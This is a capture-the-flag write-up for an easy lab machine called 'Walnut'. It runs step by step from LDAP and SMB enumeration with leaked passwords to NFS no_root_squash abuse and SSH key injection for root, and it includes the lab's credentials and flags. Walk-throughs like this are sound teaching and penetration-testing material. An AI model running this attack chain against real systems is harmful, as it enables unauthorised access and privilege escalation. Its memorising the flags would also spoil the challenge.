# Walnut - Challenge Lab Writeup

**Difficulty:** Easy  
**Target:** 10.0.16.8 (walnut.local)  
**Objective:** Gain root access and retrieve both flags

---

## Setup

Add the target to your hosts file before starting.

```bash
echo '10.0.16.8 walnut.local' | sudo tee -a /etc/hosts
```

---

## User Flag

### Step 1 - Port Scan

Run an nmap scan to identify open services.

```bash
nmap -sCV 10.0.16.8
```

The scan reveals the following open ports:

- 22 - SSH (OpenSSH 9.6p1)
- 111 - RPC
- 139 / 445 - Samba (SMB)
- 389 - LDAP (OpenLDAP)
- 2049 - NFS

### Step 2 - LDAP Enumeration

SSH with the provided credentials fails because the system uses LDAP-backed authentication. Query LDAP using the provided credentials to enumerate users and find sensitive data.

```bash
ldapsearch -x -H ldap://walnut.local \
  -D "uid=larryburns,ou=People,dc=walnut,dc=local" \
  -w 'IloveMontgommery!' \
  -b "dc=walnut,dc=local"
```

The output reveals three user accounts: `automation`, `briangeoff`, and `larryburns`. The `automation` account contains a cleartext password in its description field.

```
description: old pw asdh023incasdahff9 please change pw on all servers
```

### Step 3 - SMB Enumeration

List available SMB shares using anonymous access.

```bash
smbclient -L //10.0.16.8 -N
```

A non-standard share named `automation` is present. Connect to it using the password found in LDAP.

```bash
smbclient //10.0.16.8/automation -U 'automation%asdh023incasdahff9'
```

List the share contents.

```
smb: \> ls
```

The share is the home directory of the `automation` user. It contains a `user.txt` file, a `.ssh` directory, and a `scripts` directory. Download all files recursively.

```bash
smbclient //10.0.16.8/automation -U 'automation%asdh023incasdahff9' \
  -c 'recurse ON; prompt OFF; mget *'
```

### Step 4 - Retrieve the User Flag

```bash
cat user.txt
```

**User Flag:** `c3dcdda3950b1eca68477ce65da82392`

---

## Shell Access as Automation

The `.ssh` directory downloaded from the SMB share contains the `automation` user's private key. Use it to SSH into the target.

```bash
chmod 600 id_rsa
ssh -i id_rsa automation@10.0.16.8
```

---

## Root Flag

### Privilege Escalation Path Overview

Inside the `automation` home directory, the `scripts/` folder contains a script called `runScript.sh`. This script runs an arbitrary command as another user via `su`, using a password read from a hidden file.

```bash
cat ~/scripts/runScript.sh
```

```bash
#!/bin/bash

PARM1="$1"
PARM2=`echo -n "$1" | md5sum | cut -d' ' -f 1`
PARM3="$2"
DATE=`date +%d.%m.%Y-%Hh%m.%S`

su - "$PARM1" -c "$PARM3" < /home/automation/.hidden/"$PARM2" > /home/automation/scripts/logs/"$1"-"$DATE".log
```

The password file for each user is named after the MD5 hash of their username and stored in `.hidden/`.

```bash
ls -lah ~/.hidden/
```

Compute the MD5 hash of each known username to match it to a file.

```bash
echo -n "localjob1" | md5sum   # 4f378611beed879f4f62a43ac18452a9
echo -n "localjob3" | md5sum   # b4d2ab0ea77f3306355ac7b2bcfcd614
```

Read the password files.

```bash
cat ~/.hidden/4f378611beed879f4f62a43ac18452a9   # localjob1: brYfZknjTirtrPgM8V65
cat ~/.hidden/b4d2ab0ea77f3306355ac7b2bcfcd614.bak  # localjob3: vyZzRcreRGDjbq9t19Tb
```

The `localjob3` main file is empty but the `.bak` file still contains the password.

Switch to `localjob3` and check sudo privileges.

```bash
echo 'vyZzRcreRGDjbq9t19Tb' | su - localjob3 -c 'sudo -l'
```

Output:

```
User localjob3 may run the following commands on walnut:
    (ALL) NOPASSWD: /usr/bin/systemctl restart nfs-kernel-server.service
```

`localjob3` can restart the NFS service without a password.

### Step 1 - Check /etc/exports ACL

Check the permissions on the NFS exports file.

```bash
ls -lah /etc/exports
getfacl /etc/exports
```

The `+` at the end of the permission string indicates an ACL is set. The ACL output shows that `localjob3` has read and write access to `/etc/exports`.

```
user:localjob3:rw-
```

### Step 2 - Misconfigure NFS

Switch to `localjob3` and add a new export that disables root squashing on the `/root` directory. When `no_root_squash` is set, a root user on the NFS client retains root privileges on the mounted share.

```bash
echo 'vyZzRcreRGDjbq9t19Tb' | su - localjob3 -c '
  echo "/root *(rw,sync,no_root_squash)" >> /etc/exports &&
  sudo /usr/bin/systemctl restart nfs-kernel-server.service
'
```

Verify the export is live from your Kali machine.

```bash
showmount -e walnut.local
```

Expected output:

```
Export list for walnut.local:
/root *
```

---

### Method 1 - Read root.txt by Mounting the NFS Share

Mount the exported `/root` directory directly from Kali and read the flag without needing a shell.

```bash
mkdir /tmp/nfs_root
sudo mount -t nfs walnut.local:/ /tmp/nfs_root
cat /tmp/nfs_root/root/root.txt
sudo umount /tmp/nfs_root
```

Alternatively, use NetExec to retrieve the file without mounting.

```bash
nxc nfs walnut.local --get-file '/root/root.txt' root.txt
cat root.txt
```

**Root Flag:** `f42a447b64f431b99d7fe59f65f71bc7`

---

### Method 2 - Root Shell via SSH Key Injection

Generate a new RSA key pair on your Kali machine.

```bash
ssh-keygen -t rsa -f root_id_rsa -N ""
```

Mount the NFS share and place your public key into root's authorized_keys file.

```bash
mkdir /tmp/nfs_root
sudo mount -t nfs walnut.local:/ /tmp/nfs_root
sudo cp root_id_rsa.pub /tmp/nfs_root/root/.ssh/authorized_keys
sudo chmod 600 /tmp/nfs_root/root/.ssh/authorized_keys
sudo umount /tmp/nfs_root
```

SSH into the target as root using your private key.

```bash
ssh -i root_id_rsa root@walnut.local
```

Read the root flag.

```bash
cat /root/root.txt
```

**Root Flag:** `f42a447b64f431b99d7fe59f65f71bc7`